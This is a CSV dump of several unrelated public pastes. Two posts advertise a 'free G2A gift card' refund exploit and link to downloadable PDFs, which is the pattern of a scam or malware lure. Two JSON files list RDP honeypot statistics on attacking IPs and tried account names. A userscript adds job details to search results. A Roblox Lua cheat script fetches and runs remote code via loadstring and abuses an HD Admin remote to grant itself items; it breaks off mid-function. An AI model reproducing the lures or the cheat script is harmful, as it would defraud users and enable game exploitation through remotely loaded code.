id,title,username,language,date,content
u9amu741,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Tuesday 28th of May 2024 07:16:18 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_681300.pdf

Working as of:
29 May 2024"
j9iAT7k2,2024-05-28_stats.json,rdp_snitch,JSON,Tuesday 28th of May 2024 07:16:06 PM CDT,"{
  ""ip"": {
    ""185.113.141.141"": 404,
    ""183.82.117.93"": 2,
    ""185.198.69.19"": 20,
    ""185.198.69.4"": 18,
    ""185.198.69.7"": 14,
    ""177.11.121.117"": 2,
    ""103.120.18.192"": 8,
    ""185.198.69.25"": 12,
    ""185.198.69.6"": 14,
    ""185.198.69.2"": 18,
    ""185.198.69.22"": 6,
    ""185.198.69.8"": 22,
    ""185.198.69.17"": 10,
    ""174.138.53.122"": 2,
    ""185.198.69.30"": 14,
    ""185.198.69.18"": 6,
    ""185.198.69.20"": 8,
    ""185.198.69.14"": 14,
    ""185.198.69.16"": 20,
    ""185.198.69.26"": 8,
    ""185.198.69.27"": 20,
    ""194.165.16.72"": 4,
    ""185.198.69.28"": 12,
    ""38.255.34.146"": 12,
    ""194.165.16.11"": 4,
    ""185.198.69.13"": 18,
    ""185.198.69.5"": 20,
    ""185.198.69.23"": 10,
    ""185.198.69.3"": 12,
    ""147.78.47.97"": 6,
    ""185.198.69.24"": 22,
    ""185.198.69.31"": 8,
    ""185.198.69.10"": 2,
    ""185.198.69.15"": 20,
    ""152.42.249.196"": 24,
    ""128.199.141.142"": 32,
    ""45.227.254.54"": 8,
    ""205.210.31.164"": 6,
    ""185.198.69.29"": 14,
    ""185.198.69.9"": 10,
    ""87.251.75.64"": 2,
    ""212.70.149.142"": 8,
    ""45.87.212.182"": 4,
    ""185.198.69.21"": 10,
    ""185.198.69.11"": 12,
    ""147.182.129.72"": 2,
    ""199.45.154.66"": 2,
    ""185.170.144.3"": 4,
    ""116.140.196.215"": 2,
    ""62.202.2.57"": 2,
    ""80.66.76.121"": 2,
    ""213.109.202.237"": 12,
    ""198.235.24.178"": 6,
    ""47.100.73.108"": 4,
    ""222.219.134.171"": 4,
    ""180.136.3.186"": 8,
    ""81.246.124.198"": 4,
    ""134.119.207.154"": 10,
    ""114.112.14.39"": 2,
    ""113.31.112.144"": 2,
    ""14.29.142.134"": 14,
    ""81.19.135.47"": 6,
    ""13.70.153.24"": 4,
    ""219.146.94.100"": 2,
    ""106.58.212.195"": 2,
    ""152.32.206.49"": 2,
    ""203.57.39.224"": 4,
    ""150.223.35.239"": 4,
    ""106.225.199.92"": 4,
    ""222.93.104.67"": 2,
    ""14.29.228.234"": 6,
    ""45.227.254.55"": 4,
    ""124.67.254.109"": 4,
    ""111.47.53.153"": 2,
    ""203.33.207.66"": 4,
    ""45.227.254.26"": 4,
    ""124.225.69.183"": 2,
    ""49.84.226.2"": 6,
    ""117.41.184.60"": 2,
    ""143.64.232.76"": 2,
    ""158.51.14.114"": 4,
    ""117.16.46.253"": 2,
    ""117.50.120.247"": 2,
    ""202.69.38.200"": 2,
    ""36.91.222.100"": 2,
    ""205.210.31.37"": 6,
    ""106.75.47.172"": 2,
    ""13.92.59.40"": 2,
    ""150.223.32.106"": 2,
    ""45.79.114.233"": 2,
    ""112.116.111.230"": 4,
    ""51.89.9.215"": 2,
    ""119.167.77.62"": 8,
    ""167.248.133.116"": 2,
    ""47.100.38.137"": 2,
    ""167.94.146.50"": 2,
    ""159.223.100.69"": 8,
    ""43.133.3.182"": 4,
    ""114.217.18.245"": 4,
    ""106.58.215.193"": 2,
    ""105.114.3.98"": 6,
    ""218.65.17.106"": 2,
    ""222.219.129.74"": 2,
    ""140.246.175.203"": 2,
    ""97.91.36.242"": 2,
    ""203.56.4.242"": 4,
    ""45.79.219.201"": 8,
    ""118.122.196.39"": 2,
    ""211.91.60.69"": 4,
    ""150.223.46.21"": 2,
    ""34.72.251.13"": 2,
    ""45.156.128.12"": 2,
    ""106.58.217.149"": 2,
    ""185.71.15.186"": 2,
    ""111.10.209.99"": 2,
    ""183.6.165.166"": 2,
    ""121.224.73.44"": 2,
    ""106.58.166.180"": 2,
    ""205.210.31.87"": 6,
    ""14.18.41.26"": 2,
    ""106.58.164.84"": 2,
    ""110.166.228.174"": 2,
    ""154.221.24.152"": 2
  },
  ""asn"": {
    ""AS204094"": 404,
    ""AS18209"": 2,
    ""AS57523"": 394,
    ""AS262296"": 2,
    ""AS131939"": 8,
    ""AS14061"": 68,
    ""AS48721"": 8,
    ""AS213122"": 12,
    ""AS209588"": 12,
    ""AS267784"": 16,
    ""AS396982"": 26,
    ""AS208091"": 4,
    ""AS204428"": 8,
    ""AS9009"": 4,
    ""AS398722"": 2,
    ""AS197414"": 4,
    ""AS4837"": 18,
    ""AS3303"": 2,
    ""AS208312"": 12,
    ""AS37963"": 6,
    ""AS4134"": 70,
    ""AS5432"": 4,
    ""AS29066"": 10,
    ""AS134700"": 2,
    ""AS17621"": 2,
    ""AS8075"": 6,
    ""AS58541"": 2,
    ""AS135377"": 2,
    ""AS58519"": 22,
    ""AS134238"": 6,
    ""AS9808"": 4,
    ""AS58593"": 2,
    ""AS398465"": 4,
    ""AS18031"": 2,
    ""AS23724"": 4,
    ""AS23750"": 2,
    ""AS7713"": 2,
    ""AS63949"": 10,
    ""AS16276"": 2,
    ""AS398324"": 2,
    ""AS398705"": 2,
    ""AS132203"": 4,
    ""AS36873"": 6,
    ""AS20115"": 2,
    ""AS211680"": 2,
    ""AS15623"": 2,
    ""AS58466"": 2,
    ""AS140061"": 2,
    ""AS142403"": 2
  },
  ""isp"": {
    ""I4W - Web Solutions"": 404,
    ""Beam Telecom Pvt Ltd"": 2,
    ""Chang Way Technologies Co. Limited"": 394,
    ""Windx Telecomunica\u00e7\u00f5es"": 2,
    ""IPS INC"": 8,
    ""DigitalOcean, LLC"": 68,
    ""Flyservers S.A."": 36,
    ""Hyonix LLC"": 12,
    ""Google LLC"": 26,
    ""Xhost Internet Solutions LP"": 8,
    ""SS-Net"": 8,
    ""M247 Europe SRL"": 4,
    ""Censys, Inc."": 6,
    ""China Unicom CHINA169 Network"": 2,
    ""Swisscom (Schweiz) AG - Bluewin"": 2,
    ""Red Byte LLC"": 12,
    ""Addresses CNNIC"": 6,
    ""Chinanet"": 68,
    ""Proximus"": 4,
    ""velia.net Internetdienste GmbH"": 10,
    ""Sinoycloud Limited"": 2,
    ""UCLOUD"": 6,
    ""Microsoft Corporation"": 6,
    ""Qingdao, "": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Cloud Computing Corporation"": 22,
    ""CHINANET Jiangx province IDC network"": 6,
    ""CNC Group CHINA169 Neimeng Province Network"": 4,
    ""China Mobile communications corporation"": 4,
    ""Hainan Network of ChinaTelecom"": 2,
    ""Shanghai Blue Cloud Technology Co., Ltd"": 2,
    ""Rackdog, LLC"": 4,
    ""Sangmyung University"": 2,
    ""Advertiese Flag"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Akamai Technologies, Inc."": 10,
    ""OVH SAS"": 2,
    ""CNC Group CHINA169 Shandong Province Network"": 8,
    ""Shenzhen Tencent Computer Systems Company Limited"": 4,
    ""Airtel Networks Limited"": 6,
    ""Charter Communications"": 2,
    ""CHINA UNICOM China169 Backbone"": 4,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Telco Pack SARL"": 2,
    ""China Telecom"": 4,
    ""Guangzhou Yisu Cloud Limited"": 2
  },
  ""org"": {
    ""I4W - Web Solutions, Lda"": 404,
    ""Beam Telecom Pvt Ltd"": 2,
    ""Chang Way Technologies Co. Limited"": 406,
    ""Windx Telecomunica\u00e7\u00f5es"": 2,
    ""IPS Inc"": 8,
    ""Digital Ocean"": 2,
    ""Flyservers S.A"": 14,
    ""Hyonix LLC"": 12,
    ""DigitalOcean, LLC"": 66,
    ""UAB Host Baltic"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 4,
    ""4Media Ltd"": 8,
    ""M247 LTD"": 4,
    ""Censys, Inc."": 6,
    ""Xhostis"": 4,
    ""China United Network Communications Corporation Limited"": 2,
    ""Swisscom (Schweiz) AG"": 2,
    ""Aliyun Computing Co., LTD"": 6,
    ""Chinanet YN"": 20,
    ""Chinanet GX"": 8,
    ""Quantum ICT"": 4,
    ""Eijaj Hussain Shaikhnag"": 10,
    ""CNISP-Union Technology (Beijing) Co., Ltd"": 2,
    ""Shanghai UCloud Information Technology Company Limited"": 6,
    ""Chinanet GD"": 24,
    ""Alviva Holding Limited"": 6,
    ""Microsoft Azure Cloud (australiasoutheast)"": 4,
    ""Chinanet SD"": 12,
    ""Ucloud Information Technology"": 2,
    ""Chinanet FJ"": 12,
    ""Chinanet JX"": 8,
    ""Chinanet JS"": 14,
    ""Unknown"": 14,
    ""China Mobile"": 4,
    ""Microsoft Azure Cloud (chinanorth3)"": 2,
    ""AB E-Commerce, LLC"": 4,
    ""Korean Education Network"": 2,
    ""Gerrys Information Technology (PVT) Ltd"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Linode"": 10,
    ""OVH GmbH"": 2,
    ""Tencent Cloud Computing"": 4,
    ""Airtel Networks Limited"": 6,
    ""Spectrum"": 2,
    ""Chinanet SC"": 2,
    ""Unicom"": 4,
    ""Google Cloud (us-central1)"": 2,
    ""Inap AMS"": 2,
    ""Telco Pack SA"": 2,
    ""Chinanet QH"": 2,
    ""Ancent Group Limited"": 2
  },
  ""regionName"": {
    ""Lisbon"": 404,
    ""Telangana"": 2,
    ""Moscow"": 406,
    ""Esp\u00edrito Santo"": 2,
    ""Tokyo"": 12,
    ""New Jersey"": 12,
    ""Kaunas"": 8,
    ""California"": 38,
    ""North Holland"": 16,
    ""South West"": 56,
    ""Vilnius"": 16,
    ""Plovdiv"": 8,
    ""Hesse"": 12,
    ""New York"": 2,
    ""Beijing"": 12,
    ""Zurich"": 2,
    ""Shanghai"": 10,
    ""Yunnan"": 20,
    ""Guangxi"": 8,
    ""Brussels Capital"": 4,
    ""Grand Est"": 10,
    ""Guangdong"": 30,
    ""Victoria"": 4,
    ""Shandong"": 20,
    ""Virginia"": 4,
    ""Fujian"": 12,
    ""Jiangxi"": 8,
    ""Inner Mongolia"": 4,
    ""Hubei"": 2,
    ""Hainan"": 2,
    ""Jiangsu"": 8,
    ""Hebei"": 2,
    ""Illinois"": 4,
    ""Seoul"": 2,
    ""Punjab"": 2,
    ""Jakarta"": 2,
    ""England"": 2,
    ""Michigan"": 4,
    ""Lagos"": 6,
    ""Georgia"": 8,
    ""Sichuan"": 2,
    ""Iowa"": 2,
    ""Geneva"": 2,
    ""Qinghai"": 2,
    ""Eastern"": 2
  },
  ""country"": {
    ""Portugal"": 404,
    ""India"": 2,
    ""Russia"": 406,
    ""Brazil"": 2,
    ""Japan"": 12,
    ""United States"": 74,
    ""Lithuania"": 24,
    ""The Netherlands"": 16,
    ""Singapore"": 56,
    ""Bulgaria"": 8,
    ""Germany"": 12,
    ""China"": 142,
    ""Switzerland"": 4,
    ""Belgium"": 4,
    ""France"": 10,
    ""Australia"": 4,
    ""South Korea"": 2,
    ""Pakistan"": 2,
    ""Indonesia"": 2,
    ""United Kingdom"": 2,
    ""Nigeria"": 6,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 492,
    ""(empty)"": 14,
    ""Administr"": 410,
    ""Test"": 40,
    ""Domain"": 20,
    ""RFovDMivQ"": 2,
    ""yvOgpT"": 2,
    ""bAsWEv"": 2,
    ""beio"": 4,
    ""HVdWMdada"": 2,
    ""twHaMC"": 2,
    ""apdrfn"": 2,
    ""142.93.8.59"": 172,
    ""Administrator"": 2,
    ""frIABrKyZ"": 2,
    ""XTaZKq"": 2,
    ""teLEDU"": 2,
    ""u7d4zn5r"": 8,
    ""x4il11ds"": 8,
    ""mra3t4hb"": 2,
    ""lnfwzlTOg"": 2,
    ""gyiGEU"": 2,
    ""zoRcrt"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1196
  },
  ""client_build"": {
    ""Unknown"": 1196
  },
  ""client_name"": {
    ""Unknown"": 1196
  },
  ""ip_type"": {
    ""Unknown"": 608,
    ""proxy"": 418,
    ""hosting"": 154,
    ""hosting & proxy"": 12,
    ""mobile"": 4
  }
}"
8T0bZhzK,2024-05-28_stats.json,rdp_snitch,JSON,Tuesday 28th of May 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""185.113.141.141"": 202,
    ""183.82.117.93"": 1,
    ""185.198.69.19"": 10,
    ""185.198.69.4"": 9,
    ""185.198.69.7"": 7,
    ""177.11.121.117"": 1,
    ""103.120.18.192"": 4,
    ""185.198.69.25"": 6,
    ""185.198.69.6"": 7,
    ""185.198.69.2"": 9,
    ""185.198.69.22"": 3,
    ""185.198.69.8"": 11,
    ""185.198.69.17"": 5,
    ""174.138.53.122"": 1,
    ""185.198.69.30"": 7,
    ""185.198.69.18"": 3,
    ""185.198.69.20"": 4,
    ""185.198.69.14"": 7,
    ""185.198.69.16"": 10,
    ""185.198.69.26"": 4,
    ""185.198.69.27"": 10,
    ""194.165.16.72"": 2,
    ""185.198.69.28"": 6,
    ""38.255.34.146"": 6,
    ""194.165.16.11"": 2,
    ""185.198.69.13"": 9,
    ""185.198.69.5"": 10,
    ""185.198.69.23"": 5,
    ""185.198.69.3"": 6,
    ""147.78.47.97"": 3,
    ""185.198.69.24"": 11,
    ""185.198.69.31"": 4,
    ""185.198.69.10"": 1,
    ""185.198.69.15"": 10,
    ""152.42.249.196"": 12,
    ""128.199.141.142"": 16,
    ""45.227.254.54"": 4,
    ""205.210.31.164"": 3,
    ""185.198.69.29"": 7,
    ""185.198.69.9"": 5,
    ""87.251.75.64"": 1,
    ""212.70.149.142"": 4,
    ""45.87.212.182"": 2,
    ""185.198.69.21"": 5,
    ""185.198.69.11"": 6,
    ""147.182.129.72"": 1,
    ""199.45.154.66"": 1,
    ""185.170.144.3"": 2,
    ""116.140.196.215"": 1,
    ""62.202.2.57"": 1,
    ""80.66.76.121"": 1,
    ""213.109.202.237"": 6,
    ""198.235.24.178"": 3,
    ""47.100.73.108"": 2,
    ""222.219.134.171"": 2,
    ""180.136.3.186"": 4,
    ""81.246.124.198"": 2,
    ""134.119.207.154"": 5,
    ""114.112.14.39"": 1,
    ""113.31.112.144"": 1,
    ""14.29.142.134"": 7,
    ""81.19.135.47"": 3,
    ""13.70.153.24"": 2,
    ""219.146.94.100"": 1,
    ""106.58.212.195"": 1,
    ""152.32.206.49"": 1,
    ""203.57.39.224"": 2,
    ""150.223.35.239"": 2,
    ""106.225.199.92"": 2,
    ""222.93.104.67"": 1,
    ""14.29.228.234"": 3,
    ""45.227.254.55"": 2,
    ""124.67.254.109"": 2,
    ""111.47.53.153"": 1,
    ""203.33.207.66"": 2,
    ""45.227.254.26"": 2,
    ""124.225.69.183"": 1,
    ""49.84.226.2"": 3,
    ""117.41.184.60"": 1,
    ""143.64.232.76"": 1,
    ""158.51.14.114"": 2,
    ""117.16.46.253"": 1,
    ""117.50.120.247"": 1,
    ""202.69.38.200"": 1,
    ""36.91.222.100"": 1,
    ""205.210.31.37"": 3,
    ""106.75.47.172"": 1,
    ""13.92.59.40"": 1,
    ""150.223.32.106"": 1,
    ""45.79.114.233"": 1,
    ""112.116.111.230"": 2,
    ""51.89.9.215"": 1,
    ""119.167.77.62"": 4,
    ""167.248.133.116"": 1,
    ""47.100.38.137"": 1,
    ""167.94.146.50"": 1,
    ""159.223.100.69"": 4,
    ""43.133.3.182"": 2,
    ""114.217.18.245"": 2,
    ""106.58.215.193"": 1,
    ""105.114.3.98"": 3,
    ""218.65.17.106"": 1,
    ""222.219.129.74"": 1,
    ""140.246.175.203"": 1,
    ""97.91.36.242"": 1,
    ""203.56.4.242"": 2,
    ""45.79.219.201"": 4,
    ""118.122.196.39"": 1,
    ""211.91.60.69"": 2,
    ""150.223.46.21"": 1,
    ""34.72.251.13"": 1,
    ""45.156.128.12"": 1,
    ""106.58.217.149"": 1,
    ""185.71.15.186"": 1,
    ""111.10.209.99"": 1,
    ""183.6.165.166"": 1,
    ""121.224.73.44"": 1,
    ""106.58.166.180"": 1,
    ""205.210.31.87"": 3,
    ""14.18.41.26"": 1,
    ""106.58.164.84"": 1,
    ""110.166.228.174"": 1,
    ""154.221.24.152"": 1
  },
  ""asn"": {
    ""AS204094"": 202,
    ""AS18209"": 1,
    ""AS57523"": 197,
    ""AS262296"": 1,
    ""AS131939"": 4,
    ""AS14061"": 34,
    ""AS48721"": 4,
    ""AS213122"": 6,
    ""AS209588"": 6,
    ""AS267784"": 8,
    ""AS396982"": 13,
    ""AS208091"": 2,
    ""AS204428"": 4,
    ""AS9009"": 2,
    ""AS398722"": 1,
    ""AS197414"": 2,
    ""AS4837"": 9,
    ""AS3303"": 1,
    ""AS208312"": 6,
    ""AS37963"": 3,
    ""AS4134"": 35,
    ""AS5432"": 2,
    ""AS29066"": 5,
    ""AS134700"": 1,
    ""AS17621"": 1,
    ""AS8075"": 3,
    ""AS58541"": 1,
    ""AS135377"": 1,
    ""AS58519"": 11,
    ""AS134238"": 3,
    ""AS9808"": 2,
    ""AS58593"": 1,
    ""AS398465"": 2,
    ""AS18031"": 1,
    ""AS23724"": 2,
    ""AS23750"": 1,
    ""AS7713"": 1,
    ""AS63949"": 5,
    ""AS16276"": 1,
    ""AS398324"": 1,
    ""AS398705"": 1,
    ""AS132203"": 2,
    ""AS36873"": 3,
    ""AS20115"": 1,
    ""AS211680"": 1,
    ""AS15623"": 1,
    ""AS58466"": 1,
    ""AS140061"": 1,
    ""AS142403"": 1
  },
  ""isp"": {
    ""I4W - Web Solutions"": 202,
    ""Beam Telecom Pvt Ltd"": 1,
    ""Chang Way Technologies Co. Limited"": 197,
    ""Windx Telecomunica\u00e7\u00f5es"": 1,
    ""IPS INC"": 4,
    ""DigitalOcean, LLC"": 34,
    ""Flyservers S.A."": 18,
    ""Hyonix LLC"": 6,
    ""Google LLC"": 13,
    ""Xhost Internet Solutions LP"": 4,
    ""SS-Net"": 4,
    ""M247 Europe SRL"": 2,
    ""Censys, Inc."": 3,
    ""China Unicom CHINA169 Network"": 1,
    ""Swisscom (Schweiz) AG - Bluewin"": 1,
    ""Red Byte LLC"": 6,
    ""Addresses CNNIC"": 3,
    ""Chinanet"": 34,
    ""Proximus"": 2,
    ""velia.net Internetdienste GmbH"": 5,
    ""Sinoycloud Limited"": 1,
    ""UCLOUD"": 3,
    ""Microsoft Corporation"": 3,
    ""Qingdao, "": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Cloud Computing Corporation"": 11,
    ""CHINANET Jiangx province IDC network"": 3,
    ""CNC Group CHINA169 Neimeng Province Network"": 2,
    ""China Mobile communications corporation"": 2,
    ""Hainan Network of ChinaTelecom"": 1,
    ""Shanghai Blue Cloud Technology Co., Ltd"": 1,
    ""Rackdog, LLC"": 2,
    ""Sangmyung University"": 1,
    ""Advertiese Flag"": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Akamai Technologies, Inc."": 5,
    ""OVH SAS"": 1,
    ""CNC Group CHINA169 Shandong Province Network"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Airtel Networks Limited"": 3,
    ""Charter Communications"": 1,
    ""CHINA UNICOM China169 Backbone"": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""Telco Pack SARL"": 1,
    ""China Telecom"": 2,
    ""Guangzhou Yisu Cloud Limited"": 1
  },
  ""org"": {
    ""I4W - Web Solutions, Lda"": 202,
    ""Beam Telecom Pvt Ltd"": 1,
    ""Chang Way Technologies Co. Limited"": 203,
    ""Windx Telecomunica\u00e7\u00f5es"": 1,
    ""IPS Inc"": 4,
    ""Digital Ocean"": 1,
    ""Flyservers S.A"": 7,
    ""Hyonix LLC"": 6,
    ""DigitalOcean, LLC"": 33,
    ""UAB Host Baltic"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 2,
    ""4Media Ltd"": 4,
    ""M247 LTD"": 2,
    ""Censys, Inc."": 3,
    ""Xhostis"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""Swisscom (Schweiz) AG"": 1,
    ""Aliyun Computing Co., LTD"": 3,
    ""Chinanet YN"": 10,
    ""Chinanet GX"": 4,
    ""Quantum ICT"": 2,
    ""Eijaj Hussain Shaikhnag"": 5,
    ""CNISP-Union Technology (Beijing) Co., Ltd"": 1,
    ""Shanghai UCloud Information Technology Company Limited"": 3,
    ""Chinanet GD"": 12,
    ""Alviva Holding Limited"": 3,
    ""Microsoft Azure Cloud (australiasoutheast)"": 2,
    ""Chinanet SD"": 6,
    ""Ucloud Information Technology"": 1,
    ""Chinanet FJ"": 6,
    ""Chinanet JX"": 4,
    ""Chinanet JS"": 7,
    ""Unknown"": 7,
    ""China Mobile"": 2,
    ""Microsoft Azure Cloud (chinanorth3)"": 1,
    ""AB E-Commerce, LLC"": 2,
    ""Korean Education Network"": 1,
    ""Gerrys Information Technology (PVT) Ltd"": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Linode"": 5,
    ""OVH GmbH"": 1,
    ""Tencent Cloud Computing"": 2,
    ""Airtel Networks Limited"": 3,
    ""Spectrum"": 1,
    ""Chinanet SC"": 1,
    ""Unicom"": 2,
    ""Google Cloud (us-central1)"": 1,
    ""Inap AMS"": 1,
    ""Telco Pack SA"": 1,
    ""Chinanet QH"": 1,
    ""Ancent Group Limited"": 1
  },
  ""regionName"": {
    ""Lisbon"": 202,
    ""Telangana"": 1,
    ""Moscow"": 203,
    ""Esp\u00edrito Santo"": 1,
    ""Tokyo"": 6,
    ""New Jersey"": 6,
    ""Kaunas"": 4,
    ""California"": 19,
    ""North Holland"": 8,
    ""South West"": 28,
    ""Vilnius"": 8,
    ""Plovdiv"": 4,
    ""Hesse"": 6,
    ""New York"": 1,
    ""Beijing"": 6,
    ""Zurich"": 1,
    ""Shanghai"": 5,
    ""Yunnan"": 10,
    ""Guangxi"": 4,
    ""Brussels Capital"": 2,
    ""Grand Est"": 5,
    ""Guangdong"": 15,
    ""Victoria"": 2,
    ""Shandong"": 10,
    ""Virginia"": 2,
    ""Fujian"": 6,
    ""Jiangxi"": 4,
    ""Inner Mongolia"": 2,
    ""Hubei"": 1,
    ""Hainan"": 1,
    ""Jiangsu"": 4,
    ""Hebei"": 1,
    ""Illinois"": 2,
    ""Seoul"": 1,
    ""Punjab"": 1,
    ""Jakarta"": 1,
    ""England"": 1,
    ""Michigan"": 2,
    ""Lagos"": 3,
    ""Georgia"": 4,
    ""Sichuan"": 1,
    ""Iowa"": 1,
    ""Geneva"": 1,
    ""Qinghai"": 1,
    ""Eastern"": 1
  },
  ""country"": {
    ""Portugal"": 202,
    ""India"": 1,
    ""Russia"": 203,
    ""Brazil"": 1,
    ""Japan"": 6,
    ""United States"": 37,
    ""Lithuania"": 12,
    ""The Netherlands"": 8,
    ""Singapore"": 28,
    ""Bulgaria"": 4,
    ""Germany"": 6,
    ""China"": 71,
    ""Switzerland"": 2,
    ""Belgium"": 2,
    ""France"": 5,
    ""Australia"": 2,
    ""South Korea"": 1,
    ""Pakistan"": 1,
    ""Indonesia"": 1,
    ""United Kingdom"": 1,
    ""Nigeria"": 3,
    ""Hong Kong"": 1
  },
  ""account"": {
    ""hello"": 246,
    ""(empty)"": 7,
    ""Administr"": 205,
    ""Test"": 20,
    ""Domain"": 10,
    ""RFovDMivQ"": 1,
    ""yvOgpT"": 1,
    ""bAsWEv"": 1,
    ""beio"": 2,
    ""HVdWMdada"": 1,
    ""twHaMC"": 1,
    ""apdrfn"": 1,
    ""142.93.8.59"": 86,
    ""Administrator"": 1,
    ""frIABrKyZ"": 1,
    ""XTaZKq"": 1,
    ""teLEDU"": 1,
    ""u7d4zn5r"": 4,
    ""x4il11ds"": 4,
    ""mra3t4hb"": 1,
    ""lnfwzlTOg"": 1,
    ""gyiGEU"": 1,
    ""zoRcrt"": 1
  },
  ""keyboard"": {
    ""Unknown"": 598
  },
  ""client_build"": {
    ""Unknown"": 598
  },
  ""client_name"": {
    ""Unknown"": 598
  },
  ""ip_type"": {
    ""Unknown"": 304,
    ""proxy"": 209,
    ""hosting"": 77,
    ""hosting & proxy"": 6,
    ""mobile"": 2
  }
}"
WmZ76swB,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Tuesday 28th of May 2024 07:13:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
29 May 2024"
NU4D4C2R,ultimatestaffing.com-extended-search-results.user.js,jcunews,JavaScript,Tuesday 28th of May 2024 07:01:50 PM CDT,"// ==UserScript==
// @name         ultimatestaffing.com extended search results
// @namespace    https://greasyfork.org/en/users/85671-jcunews
// @version      0.0.1
// @license      AGPL v3
// @author       jcunews
// @description  Context: https://www.reddit.com/r/userscripts/comments/1d29bey/job_hunting_possible_to_show_wage_info_on_search/
// @match        https://careers.ultimatestaffing.com/?*
// @grant        none
// @run-at       document-end
// ==/UserScript==

//- Included more job details in search results (all except contact info) for less clicking.
//- Added search result entry numbers for easy pinpointing/remembering the location of specific entries within a result page.
//- Added background color to every two search result entries for easy distinction between adjacent result entries.
//- Compacted search result text line spacing for less scrolling.

(async () => {
  document.body.insertAdjacentHTML(""beforeend"", `<style>
#results-panel,.job p{line-height:normal}
#results-panel{counter-reset:num}
#results-panel .job:nth-child(2n){outline:.5em solid #f5f5f5;background:#f5f5f5}
#results-panel .result-title:before{counter-increment:num;content:counter(num) "". ""}
#results-panel .job p{padding-bottom:0}
#results-panel .job p:first-of-type{padding-bottom:1em}
</style>`);
  document.querySelectorAll('#results-panel .job a.result-title').forEach(async (elink, eentry, erow, epage, efield) => {
    (eentry = elink.closest('.job')).insertAdjacentHTML(""beforeend"",
      '<p><b></b>Loading more data...<b></b> </p><p><b></b> <b></b> </p><p><b></b> <b></b> </p>');
    (epage = document.createElement(""DIV"")).innerHTML = await (await fetch(elink.href)).text();
    erow = eentry.children[3];
    if (efield = epage.querySelector('#PayRange')) {
      erow.childNodes[0].textContent = efield.childNodes[0].data;
      erow.childNodes[1].data = "" "" + efield.childNodes[1].textContent;
    }
    erow = eentry.children[4];
    if (efield = epage.querySelector('#employeeTypeListItem')) {
      erow.childNodes[0].textContent = efield.childNodes[0].data;
      erow.childNodes[1].data = "" "" + efield.childNodes[1].textContent + "" | "";
    }
    if (efield = epage.querySelector('#jobTypeListItem')) {
      erow.childNodes[2].textContent = efield.childNodes[0].data;
      erow.childNodes[3].data = "" "" + efield.childNodes[1].textContent;
    }
    erow = eentry.children[5];
    if (efield = epage.querySelector('#experienceListItem')) {
      erow.childNodes[0].textContent = efield.childNodes[0].data;
      erow.childNodes[1].data = "" "" + efield.childNodes[1].textContent + "" | "";
    }
    if (efield = epage.querySelector('#educationListItem')) {
      erow.childNodes[2].textContent = efield.childNodes[0].data;
      erow.childNodes[3].data = "" "" + efield.childNodes[1].textContent;
    }
  })
})()
"
pGW9Ub92,Modified,Error_hecker,Lua,Tuesday 28th of May 2024 06:54:03 PM CDT,"
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = ""Free admin GUI"", HidePremium = false, SaveConfig = true, ConfigFolder = ""OrionTest""})

local args = {
    [1] = {
        [1] = ""Prefix"",
        [2] = "";""
    }
}

game:GetService(""ReplicatedStorage""):WaitForChild(""HDAdminClient""):WaitForChild(""Signals""):WaitForChild(""ChangeSetting""):InvokeServer(unpack(args))

OrionLib:MakeNotification({
	Name = ""GUI"",
	Content = ""Prefix has been changed to ;"",
	Image = ""rbxassetid://4483345998"",
	Time = 5
})

local Tab = Window:MakeTab({
	Name = ""Gears"",
	Icon = ""rbxassetid://7733674079"",
	PremiumOnly = false
})

Tab:AddButton({
	Name = ""OP Hammer"",
	Callback = function()
      		game.Players:Chat("";gear me 45177979"")
  	end    
})

Tab:AddButton({
	Name = ""Table"",
	Callback = function()
      		game.Players:Chat("";gear me 243788010"")
  	end    
})

Tab:AddButton({
	Name = ""Vacuum cleaner"",
	Callback = function()
      		game.Players:Chat("";gear me 84418938"")
  	end    
})

Tab:AddButton({
	Name = ""Black hole bomb"",
	Callback = function()
      		game.Players:Chat("";gear me 28277486"")
  	end    
})

Tab:AddButton({
	Name = ""Backet(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear 25162389"")
  	end    
})

Tab:AddButton({
	Name = ""Hot potato"",
	Callback = function()
      		game.Players:Chat("";gear me 25741198"")
  	end    
})

Tab:AddButton({
 Name = ""Bazooka(OP)"",
 Callback = function()
        game.Players:Chat("";gear me 169602103"")
   end    
})

Tab:AddButton({
 Name = ""Scroll(Half OP)"",
 Callback = function()
        game.Players:Chat("";gear me 125013830"")
   end    
})

Tab:AddButton({
 Name = ""Triple laser(OP)"",
 Callback = function()
        game.Players:Chat("";gear me 115377964"")
   end    
})

Tab:AddButton({
 Name = ""Tri-Lazer 3000(OP)"",
 Callback = function()
